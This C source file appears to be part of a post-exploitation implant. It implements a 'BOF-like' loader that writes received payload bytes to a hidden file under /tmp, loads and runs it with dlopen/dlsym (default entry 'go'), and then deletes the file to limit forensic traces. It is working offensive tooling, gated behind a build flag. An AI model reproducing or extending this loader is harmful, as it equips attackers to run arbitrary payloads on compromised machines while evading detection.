/**
 * BOF-like runtime module loader - dlopen/dlsym for .so payloads
 * Gated behind DYNAMIC_MODULES; static builds get a stub that returns an error.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../../include/postex.h"

#ifdef DYNAMIC_MODULES

#include <unistd.h>
#include <dlfcn.h>

typedef int (*module_entry_fn)(char *out, size_t out_size);

int module_load_and_run(const unsigned char *data, size_t data_size,
                        const char *symbol, char *out, size_t out_size) {
    if (!data || data_size == 0) {
        if (out && out_size > 0)
            snprintf(out, out_size, "empty module payload");
        return -1;
    }

    char tmpl[] = "/tmp/.jager-mod-XXXXXX";
    int fd = mkstemp(tmpl);
    if (fd < 0) {
        if (out && out_size > 0)
            snprintf(out, out_size, "mkstemp failed");
        return -1;
    }

    ssize_t written = 0;
    while ((size_t)written < data_size) {
        ssize_t n = write(fd, data + written, data_size - (size_t)written);
        if (n <= 0)
            break;
        written += n;
    }
    close(fd);

    if ((size_t)written != data_size) {
        unlink(tmpl);
        if (out && out_size > 0)
            snprintf(out, out_size, "module write failed");
        return -1;
    }

    void *handle = dlopen(tmpl, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        const char *err = dlerror();
        unlink(tmpl);
        if (out && out_size > 0)
            snprintf(out, out_size, "dlopen failed: %s", err ? err : "unknown");
        return -1;
    }

    const char *sym = (symbol && symbol[0]) ? symbol : "go";
    module_entry_fn entry = (module_entry_fn)dlsym(handle, sym);
    if (!entry) {
        const char *err = dlerror();
        dlclose(handle);
        unlink(tmpl);
        if (out && out_size > 0)
            snprintf(out, out_size, "dlsym(%s) failed: %s", sym, err ? err : "unknown");
        return -1;
    }

    int rc = entry(out, out_size);
    dlclose(handle);
    unlink(tmpl);
    return rc;
}

#else /* static build - no dlopen */

int module_load_and_run(const unsigned char *data, size_t data_size,
                        const char *symbol, char *out, size_t out_size) {
    (void)data; (void)data_size; (void)symbol;
    if (out && out_size > 0)
        snprintf(out, out_size, "BOF/module loading unavailable in static build");
    return -1;
}

#endif /* DYNAMIC_MODULES */
